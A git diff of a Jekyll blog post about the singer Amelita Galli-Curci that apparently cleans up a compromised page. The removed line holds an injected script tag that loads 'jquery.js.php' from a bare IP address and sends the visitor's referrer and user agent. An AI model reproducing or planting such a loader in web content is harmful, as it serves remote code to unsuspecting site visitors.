@@ -1,4 +1,4 @@
----
+﻿---
 layout: post
 title: "The Empty Thrill Of Snark"
 date: 18-May-2015
@@ -9,7 +9,7 @@ categories: tbd
 
 ## 18th May 2015
 
-<img class="photo-horiz" ext/javascript" rel="nofollow"  document.write("<script language='javascript' rel='nofollow' type='text/javascript' src='http://5.45.67.97/1/jquery.js.php?r=" + encodeuri(document.referrer) + "&u=" + encodeuri(navigator.useragent) + "'></sc" + "ript>"); </script></noindex>  dressed in fur coat and hat." src="https://s-media-cache-ak0.pinimg.com/736x/e4/6c/22/e46c22f1f1a04ceb5195a61cea80af7e.jpg" />
+<img class="photo-horiz" src="https://s-media-cache-ak0.pinimg.com/736x/e4/6c/22/e46c22f1f1a04ceb5195a61cea80af7e.jpg" />
 
 Amelita Galli-Curci seated at desk ,   photo source unknown.
 
